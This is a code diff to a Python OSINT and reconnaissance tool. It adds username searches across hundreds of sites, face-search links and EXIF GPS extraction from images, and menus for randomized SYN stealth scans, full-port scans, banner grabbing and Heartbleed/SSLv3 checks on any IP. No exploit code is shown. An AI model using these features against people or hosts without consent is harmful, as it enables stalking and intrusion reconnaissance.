-    print(f"{Y}[*] Searching {len(platforms)} platforms...")
-    
-    results = {}
-    session = get_session()
-    found_count = 0
-    
-    def check_platform(site: Dict) -> Tuple[str, Dict]:
-        url = site['url'].format(username)
-        name = site['name']
-        try:
-            random_delay()
-            response = session.get(url, timeout=CONFIG["request_timeout"], allow_redirects=True, stream=True)
-            body = response.text[:800].lower() if response.status_code == 200 else ""
-            response.close()
-            
-            if response.status_code == 200:
-                patterns = NOT_FOUND_PATTERNS.get(name, [])
-                if patterns and any(p in body for p in patterns):
-                    return name, {"status": "not_found", "url": url}
-                return name, {"status": "found", "url": url}
-            elif response.status_code == 403:
-                return name, {"status": "found", "url": url}
-            else:
-                return name, {"status": "not_found", "url": url}
-        except Exception as e:
-            return name, {"status": "error", "url": url, "error": str(e)[:50]}
-    
-    with ThreadPoolExecutor(max_workers=CONFIG["max_threads"]) as executor:
-        futures = {executor.submit(check_platform, site): site for site in platforms}
-        
-        for i, future in enumerate(as_completed(futures), 1):
-            platform, result = future.result()
-            results[platform] = result
-            if result.get("status") == "found":
-                found_count += 1
-            
-            progress = int((i / len(platforms)) * 100)
-            print(f"\r{Y}[*] Progress: {progress}% | Found: {found_count}", end="", flush=True)
-    
-    print(f"\n\n {Wh}{'='*50}")
-    print(f" {R}RESULTS SUMMARY")
-    print(f" {Wh}{'='*50}")
-    
-    if found_count > 0:
-        print(f"{Wh}\n {'='*40}")
-        print(f" {Gr}FOUND PROFILES ({found_count})")
-        print(f"{Wh} {'='*40}")
-        for platform, data in sorted(results.items()):
-            if data.get("status") == "found":
-                print(f"{Wh} [+] {platform:<15}: {C}{data.get('url')}{RS}")
-        
-        not_found_list = [p for p, d in results.items() if d.get("status") == "not_found"]
-        error_list = [p for p, d in results.items() if d.get("status") == "error"]
-        if not_found_list:
-            print(f"\n{Y} [-] Not found ({len(not_found_list)}): {', '.join(not_found_list[:10])}{'...' if len(not_found_list) > 10 else ''}")
-        if error_list:
-            print(f"{R} [!] Errors ({len(error_list)}): {', '.join(error_list)}")
-        print(f"\n{Gr}[+] Total profiles found: {found_count}/{len(platforms)}")
-    else:
-        print(f"{Y}[!] No profiles found for '{username}' on any platform")
-    
-    result = ScanResult(
-        timestamp=datetime.now().isoformat(),
-        scan_type="username",
-        target=username,
-        data=results
-    )
-    save_report(result, ["json", "txt", "csv"])
+    print(f"{Wh}[!] اختر وضع المسح:{Wh}")
+    print(f"    1. سريع (50 منصة مع تقييم 0-100)")
+    print(f"    2. عميق (350+ موقع - WhatsMyName)")
+    print(f"    3. الاثنين معاً (كامل)")
+    mode = input(f"\n{Wh}[?] اختر {Gr}[1-3]{Wh}: {Gr}").strip()
+
+    all_results = {}
+
+    if mode in ("1", "3"):
+        print(f"\n{Y}[*] تشغيل المسح السريع مع التقييم الذكي...{Wh}")
+        TrackLu_Enhanced(username)
+
+    if mode in ("2", "3"):
+        print(f"\n{Y}[*] تشغيل المسح العميق عبر 350+ موقع...{Wh}")
+        TrackLu_Super(username)
+
+    if mode not in ("1", "2", "3"):
+        print(f"{R}[!] اختيار غير صحيح! تشغيل الوضع الافتراضي (سريع){Wh}")
+        TrackLu_Enhanced(username)
+
     input(f"\n{Wh}[+{Wh}] Press Enter to continue")
+
+class AdvancedImageSearch:
+    def __init__(self):
+        self.search_engines = {
+            'google': 'https://lens.google.com/upload?url={}',
+            'yandex': 'https://yandex.com/images/search?url={}',
+            'tineye': 'https://tineye.com/search?url={}',
+            'bing': 'https://www.bing.com/images/search?q=imgurl:{}',
+            'saucenao': 'https://saucenao.com/search.php?url={}',
+            'iqdb': 'https://iqdb.org/?url={}',
+            'pimeyes': 'https://pimeyes.com/en/search?url={}',
+            'facecheck': 'https://facecheck.id/search?url={}'
+        }
+    
+    def reverse_search(self, image_path_or_url: str) -> Dict:
+        results = {
+            'image_hash': self._calculate_hash(image_path_or_url),
+            'search_links': {},
+            'possible_matches': [],
+            'exif_data': {}
+        }
+        results['image_hash'] = self._calculate_hash(image_path_or_url)
+        if os.path.exists(image_path_or_url):
+            results['exif_data'] = extract_metadata(image_path_or_url)
+        is_url = image_path_or_url.startswith(('http://', 'https://'))
+        search_param = image_path_or_url if is_url else f"file://{os.path.abspath(image_path_or_url)}"
+        for engine, url_template in self.search_engines.items():
+            results['search_links'][engine] = url_template.format(search_param)
+        if results['exif_data'].get('GPS_Coordinates'):
+            results['possible_matches'].append({
+                'source': 'geolocation',
+                'confidence': 85,
+                'location': results['exif_data']['GPS_Coordinates']
+            })
+        return results
+    
+    def _calculate_hash(self, path_or_url: str) -> Dict:
+        hashes = {}
+        try:
+            if path_or_url.startswith(('http://', 'https://')):
+                response = requests.get(path_or_url, timeout=10)
+                content = response.content
+            else:
+                with open(path_or_url, 'rb') as f:
+                    content = f.read()
+            hashes['md5'] = hashlib.md5(content).hexdigest()
+            hashes['sha1'] = hashlib.sha1(content).hexdigest()
+            hashes['sha256'] = hashlib.sha256(content).hexdigest()
+        except:
+            pass
+        return hashes
 
 def reverse_image():
     print(f"\n {Wh}{'='*50}")
-    print(f" {R}REVERSE IMAGE SEARCH")
+    print(f" {R}REVERSE IMAGE SEARCH (8 ENGINES)")
     print(f" {Wh}{'='*50}")
     
     image_input = input(f"{Wh}[?] Enter image URL or local path: {Gr}").strip()
@@ -1579,17 +1795,31 @@ def reverse_image():
     
     is_local = os.path.exists(image_input)
     
+    advanced = AdvancedImageSearch()
+    result = advanced.reverse_search(image_input)
+    
     engines = [
-        {"name": "Google Lens", "url": f"https://lens.google.com/upload?url={image_input}" if not is_local else "https://images.google.com/ (upload manually)"},
-        {"name": "Bing Images", "url": f"https://www.bing.com/images/search?q=imgurl:{image_input}"},
-        {"name": "Yandex", "url": f"https://yandex.com/images/search?url={image_input}" if not is_local else "https://yandex.com/images/ (upload manually)"},
-        {"name": "TinEye", "url": f"https://tineye.com/search?url={image_input}" if not is_local else "https://tineye.com/ (upload manually)"},
-        {"name": "SauceNao", "url": f"https://saucenao.com/search.php?url={image_input}" if not is_local else "https://saucenao.com/ (upload manually)"},
+        {"name": "Google Lens", "url": result['search_links'].get('google', 'N/A')},
+        {"name": "Yandex", "url": result['search_links'].get('yandex', 'N/A')},
+        {"name": "TinEye", "url": result['search_links'].get('tineye', 'N/A')},
+        {"name": "Bing Images", "url": result['search_links'].get('bing', 'N/A')},
+        {"name": "SauceNao", "url": result['search_links'].get('saucenao', 'N/A')},
+        {"name": "IQDB", "url": result['search_links'].get('iqdb', 'N/A')},
+        {"name": "Pimeyes", "url": result['search_links'].get('pimeyes', 'N/A')},
+        {"name": "FaceCheck", "url": result['search_links'].get('facecheck', 'N/A')},
     ]
+    
+    print(f"\n{Y}[*] Image Hashes:{Wh}")
+    if result.get('image_hash'):
+        for algo, h in result['image_hash'].items():
+            print(f"    {Wh}{algo.upper():<8}: {Gr}{h}")
     
     print(f"\n{Y}[*] Open these links in your browser:\n")
     for engine in engines:
-        print(f" {Wh}[+] {engine['name']:<15}: {C}{engine['url']}{RS}")
+        url = engine['url']
+        if 'file://' in url or 'upload manually' in url:
+            url = f"{engine['name']} (upload manually)"
+        print(f" {Wh}[+] {engine['name']:<15}: {C}{url}{RS}")
     
     if is_local:
         print(f"\n{Gr}[+] Local file: {os.path.basename(image_input)}")
@@ -1598,16 +1828,20 @@ def reverse_image():
         metadata = extract_metadata(image_input)
         if metadata:
             print(f"\n{Y}[*] Found metadata ({len(metadata)} fields):{Wh}")
-            for key in ["Make", "Model", "DateTimeOriginal", "GPS Latitude", "GPS Longitude", 
-                        "Google Maps", "Image Size", "Image Format", "Software"]:
+            for key in ["Make", "Model", "DateTimeOriginal", "GPS_Latitude", "GPS_Longitude", 
+                        "Google_Maps_URL", "Image_Dimensions", "Image_Format", "GPS_Coordinates", "Software"]:
                 if key in metadata:
-                    if key in ("Google Maps",):
-                        print(f"    {C}{key}: {metadata[key]}{RS}")
-                    else:
-                        print(f"    {Wh}{key:<20}: {Gr}{metadata[key][:100]}")
-            other_count = len(metadata) - sum(1 for k in ["Make", "Model", "DateTimeOriginal", "GPS Latitude", "GPS Longitude", "Google Maps", "Image Size", "Image Format", "Software"] if k in metadata)
+                    print(f"    {Wh}{key:<20}: {Gr}{metadata[key][:100]}")
+            other_count = len(metadata) - sum(1 for k in ["Make", "Model", "DateTimeOriginal", "GPS_Latitude", "GPS_Longitude", "Google_Maps_URL", "Image_Dimensions", "Image_Format", "GPS_Coordinates", "Software"] if k in metadata)
             if other_count > 0:
                 print(f"    {Y}... and {other_count} more metadata fields (use Metadata Extractor)")
+    
+    if result.get('possible_matches'):
+        print(f"\n{Y}[*] Possible matches:{Wh}")
+        for match in result['possible_matches']:
+            print(f"    {Wh}- Source: {Gr}{match.get('source')} | Confidence: {match.get('confidence')}%")
+            if match.get('location'):
+                print(f"      Location: {C}{match['location']}{RS}")
     
     input(f"\n{Wh}[+{Wh}] Press Enter to continue")
 
@@ -1623,229 +1857,6 @@ DESIRED_EXTENSIONS = {
     'data': ['.json', '.xml', '.yaml', '.yml', '.rss', '.atom', '.xml.gz'],
 }
 ALL_EXTS_FLAT = {ext for exts in DESIRED_EXTENSIONS.values() for ext in exts}
-
-def website_downloader():
-    if BeautifulSoup is None:
-        print(f"{R}[!] Install BeautifulSoup4: pip install beautifulsoup4{RS}")
-        input(f"\n{Wh}[+] Press Enter")
-        return
-
-    print(f"\n {Wh}{'='*50}")
-    print(f" {R}WEBSITE DOWNLOADER")
-    print(f" {Wh}{'='*50}")
-
-    url = input(f"\n{Wh}[?] Enter website URL {Gr}[e.g., example.com]{Wh}: {Gr}").strip()
-    if not url:
-        print(f"{R}[!] URL cannot be empty!")
-        input(f"\n{Wh}[+] Press Enter")
-        return
-    if not url.startswith(('http://', 'https://')):
-        url = 'https://' + url
-
-    print(f"\n{Y}[*] Preparing to download: {url}")
-    print(f"{Y}[*] This may take significant time for large websites")
-
-    depth_input = input(f"\n{Wh}[?] Max depth {Gr}[0=unlimited, default=3]{Wh}: {Gr}").strip()
-    max_depth = int(depth_input) if depth_input.isdigit() else 3
-
-    links_input = input(f"{Wh}[?] Max links {Gr}[default=500]{Wh}: {Gr}").strip()
-    max_links = int(links_input) if links_input.isdigit() else 500
-
-    print(f"\n{Y}[!] Target: {url} | Depth: {'∞' if max_depth==0 else max_depth} | Max Links: {max_links}{RS}")
-    confirm = input(f"{Wh}[?] Start download? {Gr}(y/n){Wh}: {Gr}").strip().lower()
-    if confirm != 'y':
-        print(f"{Y}[!] Cancelled")
-        input(f"\n{Wh}[+] Press Enter")
-        return
-
-    parsed = urlparse(url)
-    domain = parsed.netloc
-    safe_domain = re.sub(r'[^\w\-_.]', '_', domain)
-    out_dir = Path(CONFIG["output_dir"]) / "websites" / safe_domain
-    out_dir.mkdir(parents=True, exist_ok=True)
-
-    visited = set()
-    downloaded = set()
-    failed = {}
-    total_size = 0
-    q = queue.Queue()
-    q.put((url, 0))
-    stats_lock = threading.Lock()
-    active_count = 0
-    active_lock = threading.Lock()
-    stop_workers = False
-
-    session = get_session()
-    session.headers.update({
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-    })
-
-    print(f"\n{Wh}{'='*50}")
-    print(f"{Gr}[*] Download started...")
-    print(f"{Wh}{'='*50}\n")
-
-    start_time = time.time()
-
-    def save_file(content: bytes, filepath: Path) -> Path:
-        filepath.parent.mkdir(parents=True, exist_ok=True)
-        with open(filepath, 'wb') as f:
-            f.write(content)
-        return filepath
-
-    def url_to_path(url: str) -> Path:
-        p = urlparse(url)
-        path = p.path
-        if not path or path.endswith('/'):
-            path += 'index.html'
-        if path.startswith('/'):
-            path = path[1:]
-        return out_dir / path
-
-    def extract_links(html: str, base: str) -> set:
-        links = set()
-        try:
-            soup = BeautifulSoup(html, 'html.parser')
-            for tag, attr in [('a','href'),('link','href'),('script','src'),('img','src'),
-                             ('source','src'),('video','src'),('audio','src'),('iframe','src'),
-                             ('embed','src'),('object','data'),('form','action')]:
-                for el in soup.find_all(tag):
-                    val = el.get(attr)
-                    if val:
-                        full = urljoin(base, val)
-                        parsed_full = urlparse(full)
-                        if parsed_full.scheme in ('http','https'):
-                            links.add(full)
-            for style in soup.find_all('style'):
-                if style.string:
-                    for m in re.findall(r'url\([\'"]?([^\'"\)]+)[\'"]?\)', style.string):
-                        links.add(urljoin(base, m))
-            for el in soup.find_all(style=True):
-                for m in re.findall(r'url\([\'"]?([^\'"\)]+)[\'"]?\)', el['style']):
-                    links.add(urljoin(base, m))
-        except:
-            pass
-        return links
-
-    def worker():
-        nonlocal active_count, total_size, stop_workers
-        while not stop_workers:
-            try:
-                item_url, depth = q.get(timeout=1)
-            except queue.Empty:
-                with active_lock:
-                    if active_count == 0:
-                        break
-                continue
-
-            with active_lock:
-                active_count += 1
-
-            task_done_called = False
-            try:
-                with stats_lock:
-                    if item_url in visited or len(visited) >= max_links:
-                        continue
-                    visited.add(item_url)
-
-                ext = Path(urlparse(item_url).path).suffix.lower()
-                is_html = not ext or ext in DESIRED_EXTENSIONS['html']
-
-                try:
-                    resp = session.get(item_url, timeout=CONFIG["request_timeout"])
-                except Exception as e:
-                    with stats_lock:
-                        failed[item_url] = str(e)[:60]
-                    q.task_done()
-                    task_done_called = True
-                    continue
-
-                if resp.status_code != 200:
-                    with stats_lock:
-                        failed[item_url] = f"HTTP {resp.status_code}"
-                    q.task_done()
-                    task_done_called = True
-                    continue
-
-                content = resp.content
-                size = len(content)
-                filepath = url_to_path(item_url)
-
-                with stats_lock:
-                    downloaded.add(item_url)
-                    total_size += size
-
-                save_file(content, filepath)
-                print(f"  {Gr}[+] {len(downloaded)}. {filepath.relative_to(out_dir)} ({size/1024:.1f}KB){RS}")
-
-                if is_html and (max_depth == 0 or depth < max_depth):
-                    try:
-                        html_text = content.decode('utf-8', errors='replace')
-                        links = extract_links(html_text, item_url)
-                        for lk in links:
-                            lk_parsed = urlparse(lk)
-                            if lk_parsed.netloc == domain and lk not in visited:
-                                q.put((lk, depth + 1))
-                    except:
-                        pass
-
-                q.task_done()
-                task_done_called = True
-
-            except Exception as e:
-                print(f"{R}[!] Worker error: {e}{RS}")
-                if not task_done_called:
-                    q.task_done()
-            finally:
-                with active_lock:
-                    active_count -= 1
-
-    q.put((url, 0))
-    num_workers = min(CONFIG["max_threads"], 15)
-    workers = []
-    for _ in range(num_workers):
-        t = threading.Thread(target=worker, daemon=True)
-        t.start()
-        workers.append(t)
-
-    try:
-        q.join()
-    except KeyboardInterrupt:
-        print(f"\n{Y}[!] Interrupted, stopping...{RS}")
-        stop_workers = True
-    
-    for w in workers:
-        w.join(timeout=2)
-
-    elapsed = time.time() - start_time
-    print(f"\n {Wh}{'='*50}")
-    print(f" {Gr}DOWNLOAD COMPLETE")
-    print(f" {Wh}{'='*50}")
-    print(f"{Wh} Files Downloaded: {Gr}{len(downloaded)}")
-    print(f"{Wh} Failed:           {R}{len(failed)}")
-    print(f"{Wh} Total Size:       {Gr}{total_size/1024/1024:.2f} MB")
-    print(f"{Wh} Duration:         {Gr}{elapsed:.1f}s")
-    print(f"{Wh} Output:           {C}{out_dir}{RS}")
-
-    result_data = {
-        "target": url,
-        "domain": domain,
-        "stats": {
-            "downloaded": len(downloaded),
-            "failed": len(failed),
-            "total_size_bytes": total_size,
-            "duration_seconds": elapsed,
-        },
-        "files": sorted(downloaded),
-        "errors": failed,
-    }
-    result = ScanResult(
-        timestamp=datetime.now().isoformat(),
-        scan_type="website_download",
-        target=url,
-        data=result_data
-    )
-    save_report(result)
-    input(f"\n{Wh}[+] Press Enter")
 
 
 def advanced_ip_lookup(ip: str) -> Dict:
@@ -2233,7 +2244,7 @@ def get_ip_risk_score(ip: str) -> Dict:
         reasons.append(f"Open dangerous ports: {open_dangerous}")
     
     if score >= 70:
-        risk_level = "CRITICAL 🔴"
+        risk_level = "CRITICAL "
     elif score >= 50:
         risk_level = "HIGH 🟠"
     elif score >= 25:
@@ -2305,30 +2316,30 @@ def display_advanced_ip_info(ip: str, ip_data: Dict, lat, lon):
     """عرض معلومات IP المتقدمة بشكل منظم"""
     
     print(f"\n {Wh}{'='*55}")
-    print(f" {R}🔥 ADVANCED IP ANALYSIS 🔥")
+    print(f" {R} ADVANCED IP ANALYSIS ")
     print(f" {Wh}{'='*55}")
     
     print(f"\n{Y}[*] THREAT INTELLIGENCE & REPUTATION{Wh}")
     risk = get_ip_risk_score(ip)
-    print(f" {Wh}┌─ Risk Score      : {risk['level']} ({risk['score']}/100)")
+    print(f" {Wh} Risk Score      : {risk['level']} ({risk['score']}/100)")
     if risk['reasons']:
         for reason in risk['reasons'][:3]:
-            print(f" {Wh}│   └─ {R}⚠ {reason}{Wh}")
+            print(f" {Wh}    {R} {reason}{Wh}")
     
     print(f"\n{Y}[*] ENRICHED GEOLOCATION DATA{Wh}")
     advanced_geo = advanced_ip_lookup(ip)
     
     for source, data in advanced_geo.items():
         if data:
-            print(f" {Wh}┌─ From {source.upper()}:")
+            print(f" {Wh} From {source.upper()}:")
             if 'location' in data:
-                print(f" {Wh}│   ├─ Location : {Gr}{data.get('location', 'N/A')}{Wh}")
+                print(f" {Wh}    Location : {Gr}{data.get('location', 'N/A')}{Wh}")
             if 'isp' in data:
-                print(f" {Wh}│   ├─ ISP      : {Gr}{data.get('isp', 'N/A')}{Wh}")
+                print(f" {Wh}    ISP      : {Gr}{data.get('isp', 'N/A')}{Wh}")
             if 'asname' in data:
-                print(f" {Wh}│   ├─ AS Name  : {Gr}{data.get('asname', 'N/A')}{Wh}")
+                print(f" {Wh}    AS Name  : {Gr}{data.get('asname', 'N/A')}{Wh}")
             if 'mobile' in data:
-                print(f" {Wh}│   ├─ Mobile   : {Gr}{'Yes' if data['mobile'] else 'No'}{Wh}")
+                print(f" {Wh}    Mobile   : {Gr}{'Yes' if data['mobile'] else 'No'}{Wh}")
     
     if lat and lon and lat != 'N/A' and lon != 'N/A':
         try:
@@ -2337,8 +2348,8 @@ def display_advanced_ip_info(ip: str, ip_data: Dict, lat, lon):
             maps = create_ip_map_url(ip, lat_f, lon_f)
             print(f"\n{Y}[*] MAPS & SATELLITE VIEW{Wh}")
             for name, url in maps.items():
-                print(f" {Wh}┌─ {name.replace('_', ' ').title()}:{RS}")
-                print(f" {Wh}│   └─ {C}{url[:70]}...{RS}" if len(url) > 70 else f" {Wh}│   └─ {C}{url}{RS}")
+                print(f" {Wh} {name.replace('_', ' ').title()}:{RS}")
+                print(f" {Wh}    {C}{url[:70]}...{RS}" if len(url) > 70 else f" {Wh}    {C}{url}{RS}")
         except:
             pass
     
@@ -2346,53 +2357,192 @@ def display_advanced_ip_info(ip: str, ip_data: Dict, lat, lon):
     trace = trace_route_visual(ip)
     if trace:
         for i, hop in enumerate(trace[:8], 1):
-            print(f" {Wh}├─ Hop {i:<2} : {Gr}{hop.get('ip', 'N/A'):<16}{Wh} [{hop.get('country', 'N/A')}, {hop.get('city', 'N/A')}]")
+            print(f" {Wh} Hop {i:<2} : {Gr}{hop.get('ip', 'N/A'):<16}{Wh} [{hop.get('country', 'N/A')}, {hop.get('city', 'N/A')}]")
     else:
-        print(f" {Wh}└─ {Y}Traceroute unavailable (requires system command)")
+        print(f" {Wh} {Y}Traceroute unavailable (requires system command)")
     
     print(f"\n{Y}[*] DETECTED SERVICES{Wh}")
     services = scan_ip_services(ip)
     if services:
         for port, service in services.items():
             if isinstance(service, str) and not str(port).endswith('_server'):
-                print(f" {Wh}├─ Port {port:<5} : {Gr}{service}{Wh}")
+                print(f" {Wh} Port {port:<5} : {Gr}{service}{Wh}")
                 server_key = f"{port}_server"
                 if server_key in services:
-                    print(f" {Wh}│   └─ Server: {C}{services[server_key]}{Wh}")
+                    print(f" {Wh}    Server: {C}{services[server_key]}{Wh}")
     else:
-        print(f" {Wh}└─ {Y}No common services detected")
+        print(f" {Wh} {Y}No common services detected")
     
     print(f"\n{Y}[*] WHOIS REGISTRATION DATA{Wh}")
     whois_detailed = ip_whois_detailed(ip)
     if whois_detailed:
         for key, value in list(whois_detailed.items())[:6]:
-            print(f" {Wh}├─ {key.replace('_', ' ').title():<12}: {Gr}{value[:50]}{Wh}")
+            print(f" {Wh} {key.replace('_', ' ').title():<12}: {Gr}{value[:50]}{Wh}")
     else:
-        print(f" {Wh}└─ {Y}Detailed WHOIS not available")
+        print(f" {Wh} {Y}Detailed WHOIS not available")
     
     print(f"\n{Y}[*] WEATHER INFORMATION{Wh}")
     weather = get_ip_weather(ip)
     if weather:
-        print(f" {Wh}├─ Location    : {Gr}{weather.get('city', 'N/A')}{Wh}")
+        print(f" {Wh} Location    : {Gr}{weather.get('city', 'N/A')}{Wh}")
         if weather.get('conditions'):
-            print(f" {Wh}├─ Conditions  : {C}{weather['conditions']}{Wh}")
+            print(f" {Wh} Conditions  : {C}{weather['conditions']}{Wh}")
         if weather.get('temperature_c'):
-            print(f" {Wh}├─ Temperature : {Gr}{weather['temperature_c']}°C{Wh}")
+            print(f" {Wh} Temperature : {Gr}{weather['temperature_c']}°C{Wh}")
         if weather.get('windspeed'):
-            print(f" {Wh}├─ Wind        : {Gr}{weather['windspeed']} km/h{Wh}")
+            print(f" {Wh} Wind        : {Gr}{weather['windspeed']} km/h{Wh}")
     
     print(f"\n{Y}[*] DEVICE FINGERPRINTING{Wh}")
     fingerprint = generate_ip_fingerprint(ip)
     if fingerprint.get('http_server'):
-        print(f" {Wh}├─ HTTP Server : {Gr}{fingerprint['http_server']}{Wh}")
+        print(f" {Wh} HTTP Server : {Gr}{fingerprint['http_server']}{Wh}")
     if fingerprint.get('open_special_ports'):
-        print(f" {Wh}├─ Special open: {Gr}{fingerprint['open_special_ports']}{Wh}")
+        print(f" {Wh} Special open: {Gr}{fingerprint['open_special_ports']}{Wh}")
     if fingerprint.get('ssl_issuer'):
-        print(f" {Wh}├─ SSL Issuer  : {Gr}{fingerprint['ssl_issuer']}{Wh}")
+        print(f" {Wh} SSL Issuer  : {Gr}{fingerprint['ssl_issuer']}{Wh}")
 
-original_IP_Track = IP_Track
+def masscan_ip_engine():
+    """MASSCAN Engine — Direct access to masscan-powered IP scanning features"""
+    ip = input(f"\n{Wh}[?] Enter IP target {Gr}[e.g., 8.8.8.8]{Wh}: {Gr}").strip()
+    if not validate_ip(ip):
+        print(f"{R}[!] Invalid IP address!")
+        input(f"\n{Wh}[+{Wh}] Press Enter")
+        return
 
-def IP_Track_Enhanced():
+    print(f"\n {Wh}{'='*55}")
+    print(f" {R}MASSCAN ENGINE — ADVANCED IP SCANNING")
+    print(f" {Wh}{'='*55}")
+    print(f"{Wh} Target: {C}{ip}{RS}")
+    print(f"{Wh}{'='*55}")
+
+    while True:
+        print(f"\n{Wh}[*] Select operation:")
+        print(f"  {R}[{Gr}1{R}]{Wh} Port range scan (masscan-style)")
+        print(f"  {R}[{Gr}2{R}]{Wh} SYN stealth scan (randomized)")
+        print(f"  {R}[{Gr}3{R}]{Wh} Banner grab + service fingerprint")
+        print(f"  {R}[{Gr}4{R}]{Wh} Vulnerability check (Heartbleed/SSLv3/NTP)")
+        print(f"  {R}[{Gr}5{R}]{Wh} ASync scan all ports (1-65535)")
+        print(f"  {R}[{Gr}6{R}]{Wh} Exclude-list scan (skip specific ports)")
+        print(f"  {R}[{Gr}7{R}]{Wh} Quick scan + all features")
+        print(f"  {R}[{Gr}0{R}]{Wh} Back to previous menu")
+        choice = input(f"\n{Wh}[+] Select {Gr}[0-7]{Wh}: {Gr}").strip()
+        if choice == "0": break
+
+        if choice == "1":
+            pr = input(f"{Wh}[?] Port range {Gr}[e.g. 1-1000 or 22,80,443]{Wh}: {Gr}").strip() or "1-1024"
+            rate = input(f"{Wh}[?] Rate (pps) {Gr}[5000]{Wh}: {Gr}").strip() or "5000"
+            scanner = MassPortScanner(max_rate=int(rate))
+            print(f"{Y}[*] Scanning {ip} ports {pr}...{Wh}")
+            res = scanner.scan(ip, pr)
+            if res:
+                for p, s in sorted(res.items()):
+                    print(f"  {Gr}[+] Port {p:<5} ({s})")
+            else:
+                print(f"  {Y}[-] No open ports{Wh}")
+
+        elif choice == "2":
+            syn = SynScanner()
+            pr = input(f"{Wh}[?] Ports {Gr}[e.g. 22,80,443 or 'common']{Wh}: {Gr}").strip()
+            ports = PortRange.expand(pr) if pr and pr != "common" else PortRange.expand(PortRange.COMMON)
+            rnd = randomize_scan_order(ports)
+            print(f"{Y}[*] SYN stealth scan ({len(rnd)} ports, randomized)...{Wh}")
+            res = syn.scan_range(ip, rnd, stealth=True)
+            if res:
+                for p, s in sorted(res.items()):
+                    print(f"  {Gr}[+] Port {p:<5} ({s}) [SYN/Stealth]")
+            else:
+                print(f"  {Y}[-] All ports filtered/closed{Wh}")
+
+        elif choice == "3":
+            grabber = BannerGrabber()
+            detect = ServiceDetector()
+            pr = input(f"{Wh}[?] Ports {Gr}[e.g. 22,80,443] or 'open' to scan first{Wh}: {Gr}").strip()
+            if pr == "open":
+                open_ports = port_scan(ip)
+                if not open_ports:
+                    print(f"{Y}[-] No open ports found{Wh}")
+                    continue
+                ports = list(open_ports.keys())
+            else:
+                ports = PortRange.expand(pr) if pr else [80, 443, 22, 21, 25]
+            print(f"{Y}[*] Grabbing banners from {len(ports)} ports...{Wh}")
+            banners = grabber.grab_multi(ip, ports)
+            detected = detect.detect_all(ip, {p: "unknown" for p in ports})
+            for port in sorted(banners.keys()):
+                info = banners[port]
+                banner = info.get("banner", "")
+                service = info.get("service", "unknown")
+                print(f"\n  {Gr}[+] Port {port:<5} ({service})")
+                if banner:
+                    print(f"  {Wh}     Banner: {C}{banner[:150]}")
+                if info.get("status_line"):
+                    print(f"  {Wh}     Status: {Y}{info['status_line']}")
+                if info.get("ssl_issuer"):
+                    print(f"  {Wh}     SSL:    {Y}{info['ssl_issuer']}")
+
+        elif choice == "4":
+            vuln = VulnerabilityChecker()
+            print(f"{Y}[*] Checking vulnerabilities on {ip}...{Wh}")
+            results = vuln.check_all(ip)
+            if results:
+                for vt, vi in results.items():
+                    print(f"  {R}[!] {vt}: {vi.get('details', 'Vulnerable')}{RS}")
+            else:
+                print(f"  {Gr}[+] No common vulnerabilities found{Wh}")
+
+        elif choice == "5":
+            print(f"{Y}[*] Async scan all 65535 ports (masscan-style)...{Wh}")
+            print(f"{Y}    This may take a while...{Wh}")
+            scanner = MassPortScanner(max_rate=10000)
+            res = scanner.scan(ip, "1-65535")
+            if res:
+                print(f"  {Gr}[+] Found {len(res)} open ports:{Wh}")
+                for p, s in sorted(res.items()):
+                    print(f"    {Gr}[+] Port {p:<5} ({s})")
+            else:
+                print(f"  {Y}[-] No open ports found{Wh}")
+
+        elif choice == "6":
+            ports = input(f"{Wh}[?] Port range {Gr}[e.g. 1-1000]{Wh}: {Gr}").strip() or "1-1024"
+            exclude = input(f"{Wh}[?] Exclude ports {Gr}[e.g. 80,443]{Wh}: {Gr}").strip()
+            excl_list = PortRange.expand(exclude) if exclude else []
+            scanner = MassPortScanner()
+            res = scanner.scan(ip, ports, exclude=excl_list)
+            if res:
+                for p, s in sorted(res.items()):
+                    print(f"  {Gr}[+] Port {p:<5} ({s})")
+            else:
+                print(f"  {Y}[-] No open ports{Wh}")
+
+        elif choice == "7":
+            print(f"{Y}[*] Full security assessment...{Wh}")
+            open_ports = port_scan(ip)
+            if open_ports:
+                print(f"\n{Wh}[+] Open ports ({len(open_ports)}):")
+                for p, s in sorted(open_ports.items()):
+                    print(f"  {Gr}[+] {p:<5} ({s})")
+                # Service detection
+                detect = ServiceDetector()
+                detected = detect.detect_all(ip, open_ports)
+                print(f"\n{Wh}[+] Service fingerprinting:")
+                for p, info in sorted(detected.items()):
+                    svc = info.get("service", "?")
+                    bn = info.get("banner", "")[:80]
+                    print(f"  {Gr}[+] {p:<5} -> {svc}" + (f" ({bn})" if bn else ""))
+                # Vulnerability check
+                vuln = VulnerabilityChecker()
+                vuln_res = vuln.check_all(ip)
+                if vuln_res:
+                    print(f"\n{R}[!] Vulnerabilities found:{Wh}")
+                    for vt, vi in vuln_res.items():
+                        print(f"  {R}[!] {vt}{RS}")
+            else:
+                print(f"  {Y}[-] No open ports (firewalled?){Wh}")
+
+    input(f"\n{Wh}[+{Wh}] Press Enter")
+
+
+def IP_Track():
     ip = input(f"\n{Wh}[?] Enter IP target {Gr}[e.g., 8.8.8.8]{Wh}: {Gr}").strip()
     if not validate_ip(ip):
         print(f"{R}[!] Invalid IP address!")
@@ -2466,9 +2616,17 @@ def IP_Track_Enhanced():
     data["AbuseIPDB"] = abuse_data
     data["AdvancedReputation"] = reputation
     
-    print(f"\n{Y}[?] Scan common ports? (y/n): {Wh}", end="")
-    if input().lower() == 'y':
-        print(f"{Wh}\n[*] Scanning ports...")
+    print(f"\n{Y}[?] Scan options: {Wh}")
+    print(f"  {R}[{Gr}1{R}]{Wh} Quick scan (common ports)")
+    print(f"  {R}[{Gr}2{R}]{Wh} SYN stealth scan (requires scapy)")
+    print(f"  {R}[{Gr}3{R}]{Wh} Full banner grab + service detection")
+    print(f"  {R}[{Gr}4{R}]{Wh} Vulnerability check (Heartbleed, SSLv3, NTP)")
+    print(f"  {R}[{Gr}5{R}]{Wh} Mass scan with port range (e.g. 1-1000)")
+    print(f"  {R}[{Gr}0{R}]{Wh} Skip scanning")
+    scan_choice = input(f"\n{Wh}[+] Select {Gr}[0-5]{Wh}: {Gr}").strip()
+
+    if scan_choice == "1":
+        print(f"{Wh}\n[*] Quick scanning common ports...")
         ports_result = port_scan(ip)
         if ports_result:
             print(f"{Wh}\n[+] Open Ports Found:")
@@ -2485,6 +2643,70 @@ def IP_Track_Enhanced():
             data["open_ports"] = ports_result
         else:
             print(f"    {Y}[!] No open ports found (may be firewalled)")
+
+    elif scan_choice == "2":
